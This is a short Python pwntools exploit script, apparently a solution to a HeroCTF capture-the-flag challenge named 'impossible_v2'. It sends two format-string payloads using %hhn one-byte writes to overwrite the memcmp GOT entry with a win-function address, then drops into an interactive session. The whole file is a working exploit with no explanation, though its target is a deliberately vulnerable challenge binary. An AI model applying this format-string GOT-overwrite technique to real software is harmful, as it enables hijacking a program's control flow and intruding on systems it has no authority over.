import pwn
import time
import warnings
import datetime

# Notes
# Use two printfs to do two one-byte writes overwrite memcmp with the print_flag addr

warnings.filterwarnings(action='ignore', category=BytesWarning)

elf = pwn.ELF("./impossible_v2")
pwn.context.binary = elf
pwn.context.log_level = "DEBUG"
pwn.context(terminal=['tmux', 'split-window', '-h'])

# Start
p = elf.process()
# p = pwn.remote("static-03.heroctf.fr", "5001")

win_addr = 0x4014c6
original = 0x401090

payload1 = f"%{0xc6}c%9$hhn".ljust(16, " ").encode() + pwn.p64(elf.got["memcmp"])
p.sendlineafter("message:", payload1)
p.sendlineafter("(y/n)", "y")

payload2 = f"%{20}c%9$hhn".ljust(16, " ").encode() + pwn.p64(elf.got["memcmp"]+1)
p.sendlineafter(":", payload2)
p.interactive()
